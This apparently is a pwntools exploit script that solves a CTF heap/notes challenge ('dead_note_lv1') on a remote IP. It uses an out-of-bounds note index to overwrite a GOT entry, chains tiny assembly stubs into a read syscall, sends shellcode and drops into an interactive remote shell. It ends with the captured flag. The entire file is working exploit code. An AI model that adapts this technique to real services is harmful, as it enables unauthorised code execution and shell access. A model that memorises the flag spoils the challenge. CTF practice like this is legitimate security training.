from pwn import *

#0x0000555555757000 0x0000555555759000 rwxp  [heap]
#0x00007ffffffde000 0x00007ffffffff000 rwxp  [stack]

HOST,PORT="159.89.197.67",3333
context.arch = 'amd64'

def delete_note(index):
	r.sendlineafter("Your choice: ", "2")
	r.sendlineafter("Index: ", str(index))
def add_note(index, notes_number, content):
	r.sendlineafter("Your choice: ", "1")
	r.sendlineafter("Index: ", str(index))
	r.sendlineafter("Number of Note: ", str(notes_number))
	r.sendlineafter("Content: ", str(content))

#r = process("./dead_note_lv1")
r = remote(HOST,PORT)
sh = asm("xor eax, eax; ret;") #syscall read 
index = (0x202028 - 0x02020E0 )/8
print "[+] index : "+str(index)
print "[+] Adding note1 "
add_note(index, 1, sh) 
print "[+] Adding note2 "
add_note(1, 1, asm("mov dl, 0x50; syscall; jmp rsi;")) #read 0x50 from stdin then jump to it 
print "[+] Adding note3 "
add_note(index, 1, asm("nop; xor eax, eax; xor edi, edi; jmp $-0x20-5"))
print "[+] Adding note4 "
add_note(1, 1, "TRIGGER")
print "[+] Sending shellcode "
r.sendline(asm(shellcraft.amd64.linux.sh()))
r.interactive()

#Flag : ISITDTU{756d6e4267751936c6b045ae7bbfc26f}
